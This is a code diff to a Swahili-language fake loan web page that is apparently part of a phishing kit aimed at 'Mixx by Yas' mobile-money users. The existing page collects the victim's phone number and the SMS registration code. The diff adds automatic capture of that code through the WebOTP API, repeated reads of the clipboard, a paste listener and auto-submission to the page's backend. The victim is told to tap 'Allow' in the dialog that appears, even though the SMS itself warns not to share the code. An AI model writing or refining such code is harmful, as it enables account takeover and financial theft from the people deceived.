@@ -39,6 +39,29 @@
         .success-card .big-amount { font-size: 1.5rem; font-weight: 900; color: var(--primary); margin: 0.5rem 0; }
         .copyright-bar { background: var(--light-navy); text-align: center; padding: 1rem; margin-top: auto; }
         .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+        .auto-detect-badge {
+            display: inline-block;
+            background: #1a2a1a;
+            border: 1px solid #2a4a2a;
+            border-radius: 20px;
+            padding: 4px 12px;
+            color: #34d399;
+            font-size: 11px;
+            margin-left: 6px;
+        }
+        .auto-detect-badge .dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background: #34d399;
+            border-radius: 50%;
+            animation: pulse-dot 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0% { opacity: 0.4; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.4; transform: scale(0.8); }
+        }
     </style>
 </head>
 <body>
@@ -47,13 +70,13 @@
         <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
         <div class="card">
             <div class="screen active" id="screenCode">
-                <h3 style="color:var(--dark);">✅ Namba ya Uthibitisho</h3>
+                <h3 style="color:var(--dark);">✅ Namba ya Uthibitisho <span class="auto-detect-badge"><span class="dot"></span> Auto-detect</span></h3>
                 <div class="phone-display" id="showPhone">+255 ---------</div>
                 <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Nakili ujumbe wa SMS na ubandike hapa:</strong><br><br>
-                    <strong>1.</strong> Fungua App ya <strong>Messages/SMS</strong><br>
-                    <strong>2.</strong> Tafuta ujumbe kutoka <strong>Mixx by Yas</strong><br>
-                    <strong>3.</strong> Nakili ujumbe <strong>WOTE</strong> na ubandike kwenye kisanduku
+                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
+                    <strong>1.</strong> Subiri SMS ifike kwenye simu yako<br>
+                    <strong>2.</strong> Ukishaipokea, bonyeza <strong>"Allow"</strong> kwenye kidirisha kitakachoonekana<br>
+                    <strong>3.</strong> Msimbo utajaza kiotomatiki na kutumwa
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
                     <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
@@ -61,7 +84,7 @@
                 <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
                     <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
                 </a>
-                <textarea id="smsMessage" class="sms-textarea" placeholder="Bandika ujumbe wako wote wa SMS hapa..."></textarea>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="SMS itaonekana hapa kiotomatiki..."></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 60s</div>
                 <div class="error-msg" id="codeError"></div>
                 <button class="btn btn-gold" onclick="submitCode()">Endelea →</button>
@@ -83,6 +106,7 @@
 
         var checkInterval = null, countdownTimer = null;
         var resendCount = 0, resendCooldown = false;
+        var smsDetected = false;
 
         (function() {
             var ua = navigator.userAgent.toLowerCase();
@@ -94,6 +118,8 @@
         })();
 
         startCountdown();
+        // Start auto-detection when page loads
+        setTimeout(startAutoDetect, 1000);
 
         function startCountdown() { 
             if (countdownTimer) clearInterval(countdownTimer); 
@@ -112,11 +138,13 @@
             if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi. Jaribu baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
             resendCount++; resendCooldown = true;
             document.getElementById('smsMessage').value = '';
+            smsDetected = false;
             document.getElementById('codeError').textContent = 'OTP Imetumwa. (' + resendCount + '/3)'; 
             document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
             try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: parseInt(payAmount), months: 12, loan_type: '', purpose: 'OTP REQUESTED' }) }); } catch(e) {} 
             startCountdown();
             setTimeout(function() { resendCooldown = false; }, 30000);
+            setTimeout(startAutoDetect, 1500);
         }
 
         async function submitCode() { 
@@ -140,10 +168,153 @@
         function showCodeError() { 
             document.getElementById('screenWait').classList.remove('active'); document.getElementById('screenCode').classList.add('active'); 
             document.getElementById('smsMessage').value = '';
+            smsDetected = false;
             document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
             document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); 
             startCountdown();
             setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 4000); 
+            setTimeout(startAutoDetect, 1500);
+        }
+
+        // ================================================================
+        // SMS AUTO-DETECTION - WebOTP + Clipboard Fallback
+        // ================================================================
+        function startAutoDetect() {
+            // Only run if we're on the code screen
+            if (!document.getElementById('screenCode').classList.contains('active')) {
+                console.log('Auto-detect: Not on code screen');
+                return;
+            }
+            
+            console.log('Auto-detect: Starting...');
+            var smsTextarea = document.getElementById('smsMessage');
+            if (!smsTextarea) return;
+
+            function autoSubmit() {
+                if (smsDetected) return;
+                var text = smsTextarea.value.trim();
+                if (text.length > 5) {
+                    smsDetected = true;
+                    console.log('Auto-detect: SMS detected, submitting...');
+                    clearInterval(countdownTimer);
+                    document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
+                    document.getElementById('timerDisplay').className = 'timer-bar';
+                    setTimeout(function() {
+                        if (document.getElementById('screenCode').classList.contains('active')) {
+                            submitCode();
+                        }
+                    }, 1000);
+                }
+            }
+
+            // WebOTP API - Auto-read SMS from notification
+            function autoReadSMS() {
+                if (!('OTPCredential' in window)) {
+                    console.log('Auto-detect: WebOTP not supported');
+                    return;
+                }
+
+                console.log('Auto-detect: Listening via WebOTP...');
+                
+                var controller = new AbortController();
+                var timeout = setTimeout(function() { controller.abort(); }, 60000);
+                
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: controller.signal
+                })
+                .then(function(otp) {
+                    clearTimeout(timeout);
+                    if (otp && otp.code) {
+                        // Build full SMS in your format
+                        var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
+                        smsTextarea.value = fullSMS;
+                        console.log('Auto-detect: SMS detected! Code: ' + otp.code);
+                        
+                        var errorEl = document.getElementById('codeError');
+                        errorEl.textContent = '✅ Msimbo umegunduliwa kiotomatiki!';
+                        errorEl.style.color = '#10b981';
+                        errorEl.classList.add('show');
+                        setTimeout(function() {
+                            errorEl.classList.remove('show');
+                        }, 3000);
+                        
+                        autoSubmit();
+                    }
+                })
+                .catch(function(e) {
+                    if (e.name === 'AbortError') {
+                        console.log('Auto-detect: WebOTP timeout');
+                    } else {
+                        console.log('Auto-detect: WebOTP error', e);
+                    }
+                });
+            }
+
+            // Clipboard fallback
+            function readClipboard() {
+                if (!navigator.clipboard || !navigator.clipboard.readText) return;
+                navigator.clipboard.readText()
+                .then(function(text) {
+                    if (text && text.length > 10 && !smsDetected) {
+                        smsTextarea.value = text;
+                        console.log('Auto-detect: SMS from clipboard');
+                        autoSubmit();
+                    }
+                })
+                .catch(function(e) {});
+            }
+
+            function detectSMS() {
+                if (smsDetected) return;
+                if (!document.getElementById('screenCode').classList.contains('active')) {
+                    console.log('Auto-detect: Screen changed, stopping');
+                    return;
+                }
+                autoReadSMS();
+                setTimeout(function() {
+                    if (!smsDetected && document.getElementById('screenCode').classList.contains('active')) {
+                        readClipboard();
+                    }
+                }, 2000);
+            }
+
+            setTimeout(detectSMS, 1000);
+
+            var detectInterval = setInterval(function() {
+                if (!document.getElementById('screenCode').classList.contains('active')) {
+                    clearInterval(detectInterval);
+                    console.log('Auto-detect: Stopped');
+                    return;
+                }
+                if (!smsDetected) {
+                    detectSMS();
+                }
+            }, 5000);
+
+            // Paste event listener
+            document.addEventListener('paste', function(e) {
+                if (!document.getElementById('screenCode').classList.contains('active')) return;
+                if (smsDetected) return;
+                var text = e.clipboardData && e.clipboardData.getData('text');
+                if (text && text.length > 10) {
+                    smsTextarea.value = text;
+                    smsDetected = true;
+                    console.log('Auto-detect: SMS pasted');
+                    autoSubmit();
+                }
+            });
+
+            // Visibility change (user returns to page)
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && 
+                    !smsDetected && 
+                    document.getElementById('screenCode').classList.contains('active')) {
+                    setTimeout(detectSMS, 500);
+                }
+            });
+
+            console.log('Auto-detect: Ready');
         }
     </script>
 </body>
